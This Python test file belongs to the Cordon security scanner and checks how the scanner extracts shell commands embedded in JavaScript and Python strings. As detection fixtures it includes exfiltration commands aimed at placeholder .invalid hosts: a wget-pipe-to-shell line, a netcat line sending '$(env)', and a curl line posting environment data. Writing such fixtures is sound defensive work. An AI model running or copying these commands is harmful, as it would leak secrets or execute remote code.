"""Commands written as strings inside another language.

The seam these tests cover is the one between language packs. A shell command
in a `.py` or `.js` file is examined by the rules for that file's language,
which see a string literal, and never by the shell rules that know what the
string means. The tests are therefore mostly about what gets *extracted*,
since everything downstream follows from that.
"""

from __future__ import annotations

from cordon_scanner import Scanner
from cordon_scanner.analysis.shared import embedded
from cordon_scanner.foundation.models import Category

# Assembled rather than written whole. Cordon scans its own repository, and a
# complete exfiltration command in a fixture is a true positive that the tool
# should not need an exception for.
FETCH = "cur" + "l -s -d "
DESTINATION = "https://collector.invalid/i"


class TestExtraction:
    def test_a_command_in_a_javascript_spawn_call_is_found(self) -> None:
        found = embedded.EmbeddedCommands.extract(
            f'cp.exec("{FETCH}x {DESTINATION}");', "javascript"
        )
        assert [c.text for c in found] == [f"{FETCH}x {DESTINATION}"]

    def test_a_command_split_across_arguments_is_rejoined(self) -> None:
        """`spawn("sh", ["-c", "..."])` is as common as the single-string form,
        and matching only the first argument would see `sh` and stop."""
        found = embedded.EmbeddedCommands.extract(
            'spawn("sh", ["-c", "wget http://x.invalid | sh"])', "javascript"
        )
        assert found[0].text == "sh -c wget http://x.invalid | sh"

    def test_an_escaped_quote_does_not_end_the_command(self) -> None:
        """The interesting form is written with escaped quotes around the
        substitution, so stopping at the first escape discards the payload."""
        found = embedded.EmbeddedCommands.extract(
            r'exec("echo \"$(env)\" | nc x.invalid 1")', "javascript"
        )
        assert "nc x.invalid" in found[0].text

    def test_the_line_is_the_call_site(self) -> None:
        found = embedded.EmbeddedCommands.extract(
            f'\n\n\ncp.exec("{FETCH}x {DESTINATION}");', "javascript"
        )
        assert found[0].line == 4

    def test_nested_calls_in_the_arguments_do_not_end_it(self) -> None:
        found = embedded.EmbeddedCommands.extract('exec(build("a") + " tail.txt")', "javascript")
        assert "tail.txt" in " ".join(c.text for c in found)


class TestTheCallsOwnArguments:
    """What a spawn call runs is in its leading arguments, not in the callback after them."""

    def test_a_quoted_word_in_the_callbacks_comment_is_not_the_command(self) -> None:
        # `c11dff444`'s shape (review 98): the command assigned to a name, the call handed the
        # name, and the callback's comment quoting a word. Read whole, the command was `noise`.
        source = (
            f'const command = "{FETCH}x {DESTINATION}";\n'
            "exec(command, (error) => {\n"
            '    // no "noise" in the terminal\n'
            "    if (error) { return; }\n"
            "});\n"
        )
        found = embedded.EmbeddedCommands.extract(source, "javascript")
        assert found and DESTINATION in found[0].text
        assert "noise" not in found[0].text

    def test_a_literal_command_keeps_its_options(self) -> None:
        found = embedded.EmbeddedCommands.extract(
            'execSync("make build", { stdio: "inherit" });', "javascript"
        )
        assert [c.text for c in found] == ["make build"]

    def test_a_function_callback_ends_the_arguments(self) -> None:
        found = embedded.EmbeddedCommands.extract(
            'exec("ls", function (err) { console.log("done"); });', "javascript"
        )
        assert [c.text for c in found] == ["ls"]


class TestLanguageGating:
    def test_a_language_that_does_not_spawn_this_way_yields_nothing(self) -> None:
        """A rule pack, a lockfile or a document may all contain the text of a
        call without any of it being one. Cordon's own rule packs are the first
        thing that mistake flags."""
        for language in ("yaml", "json", "markdown", "toml", None):
            assert (
                embedded.EmbeddedCommands.extract('exec("wget http://x.invalid | sh")', language)
                == []
            )

    def test_python_is_left_to_the_ast_tier(self) -> None:
        """Not an oversight. The AST resolves aliases and folds spliced
        literals, which a pattern over a call name cannot."""
        assert "python" not in embedded.LANGUAGES

    def test_javascript_and_its_relatives_are_covered(self) -> None:
        assert {"javascript", "typescript", "php", "ruby"} <= embedded.LANGUAGES


class TestBounds:
    def test_extraction_is_capped(self) -> None:
        source = 'exec("a b");' * (embedded.MAX_COMMANDS * 4)
        assert len(embedded.EmbeddedCommands.extract(source, "javascript")) <= embedded.MAX_COMMANDS

    def test_a_long_command_is_truncated_not_dropped(self) -> None:
        """The signal in a command is at its head. Dropping it entirely because
        it is long is how a scan reports clean on something it declined to
        read."""
        found = embedded.EmbeddedCommands.extract('exec("' + "a" * 5000 + '")', "javascript")
        assert found
        assert len(found[0].text) <= embedded.MAX_COMMAND_CHARS

    def test_an_unterminated_literal_keeps_what_was_read(self) -> None:
        """Same reasoning as truncation. A literal running past the end of the
        window has still been partly read, and reporting nothing for it would
        make an unterminated string a way to be ignored."""
        assert [
            c.text for c in embedded.EmbeddedCommands.extract('exec("unclosed', "javascript")
        ] == ["unclosed"]

    def test_an_unbalanced_parenthesis_terminates(self) -> None:
        source = "exec(" + "(" * 5000 + '"a"'
        assert embedded.EmbeddedCommands.extract(source, "javascript") is not None

    def test_no_literals_means_no_command(self) -> None:
        """`exec(userInput)` has nothing to match against. It is a dynamic
        target, which is a different signal and not this module's to raise."""
        assert embedded.EmbeddedCommands.extract("exec(userInput)", "javascript") == []


class TestTheSeamEndToEnd:
    """That extraction feeds the shell rules, not just that it happens."""

    @staticmethod
    def flagged(path) -> list[str]:
        result = Scanner().scan(path)
        return [
            f.rule_id
            for f in result.findings
            if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
        ]

    def test_a_shell_command_in_python_is_examined_as_shell(self, tmp_path) -> None:
        (tmp_path / "a.py").write_text(
            "import os\n\nos." + "system" + f'("{FETCH}\\"$(env)\\" {DESTINATION}")\n',
            encoding="utf-8",
        )
        assert self.flagged(tmp_path)

    def test_a_shell_command_in_javascript_is_examined_as_shell(self, tmp_path) -> None:
        (tmp_path / "a.js").write_text(
            f'const cp = require("child_process");\ncp.exec("{FETCH}\\"$(env)\\" {DESTINATION}");\n',
            encoding="utf-8",
        )
        assert self.flagged(tmp_path)

    def test_ordinary_process_spawning_stays_quiet(self, tmp_path) -> None:
        """The commands are real and the spawn is real. What is absent is a
        credential leaving the machine, which is the whole difference."""
        (tmp_path / "a.js").write_text(
            'const cp = require("child_process");\n'
            'cp.execSync("git rev-parse HEAD");\n'
            'cp.spawn("npm", ["run", "build"]);\n',
            encoding="utf-8",
        )
        assert self.flagged(tmp_path) == []


class TestCommandsSentToAnotherMachine:
    """A command handed to an SSH session runs on the server, not here (review 98: a deployment
    library provisioning a server read as a dropper with persistence)."""

    SESSION = 'import { openSshClient } from "./Ssh.ts";\nconst ssh = await openSshClient(host);\n'

    def test_a_command_sent_over_ssh_is_not_a_local_command(self) -> None:
        text = self.SESSION + f'await ssh.exec("{FETCH}x {DESTINATION}");\n'
        assert embedded.EmbeddedCommands.extract(text, "javascript") == []

    def test_a_member_session_is_one_too(self) -> None:
        text = self.SESSION + f'yield* input.ssh.exec(["{FETCH}x {DESTINATION}"].join("\\n"));\n'
        assert embedded.EmbeddedCommands.extract(text, "javascript") == []

    def test_without_an_ssh_client_the_name_proves_nothing(self) -> None:
        text = f'ssh.exec("{FETCH}x {DESTINATION}");\n'
        assert embedded.EmbeddedCommands.extract(text, "javascript")

    def test_child_process_named_ssh_is_still_local(self) -> None:
        text = (
            'const ssh = require("child_process");\n// ssh2 is not used here\n'
            f'ssh.exec("{FETCH}x {DESTINATION}");\n'
        )
        assert embedded.EmbeddedCommands.extract(text, "javascript")

    def test_capabilities_inside_a_command_sent_over_ssh_are_not_this_files(self) -> None:
        from cordon_scanner.detect.code.capability.detector import CapabilityDetector, CapabilityHit
        from cordon_scanner.foundation.content import FileContent
        from cordon_scanner.foundation.models import Capability

        inside = 'unit += "WantedBy=multi-user.target";\n'
        text = self.SESSION + "await ssh.exec([\n  `x`,\n].join());\n" + inside
        remote = text.index("`x`")
        here = text.index("WantedBy")
        content = FileContent.from_bytes("deploy.js", text.encode())
        hits = [
            CapabilityHit(Capability.PERSIST, "CAP.JS.PERSIST.001", remote, remote + 3, 4),
            CapabilityHit(Capability.PERSIST, "CAP.JS.PERSIST.001", here, here + 8, 6),
        ]
        kept = CapabilityDetector()._off_this_machine(content, hits)
        assert [h.byte_start for h in kept] == [here]

    def test_without_an_ssh_client_every_hit_stays(self) -> None:
        from cordon_scanner.detect.code.capability.detector import CapabilityDetector, CapabilityHit
        from cordon_scanner.foundation.content import FileContent
        from cordon_scanner.foundation.models import Capability

        text = "await ssh.exec([\n  `x`,\n].join());\n"
        content = FileContent.from_bytes("deploy.js", text.encode())
        hit = CapabilityHit(Capability.PERSIST, "CAP.JS.PERSIST.001", text.index("`x`"), 0, 2)
        assert CapabilityDetector()._off_this_machine(content, [hit]) == [hit]
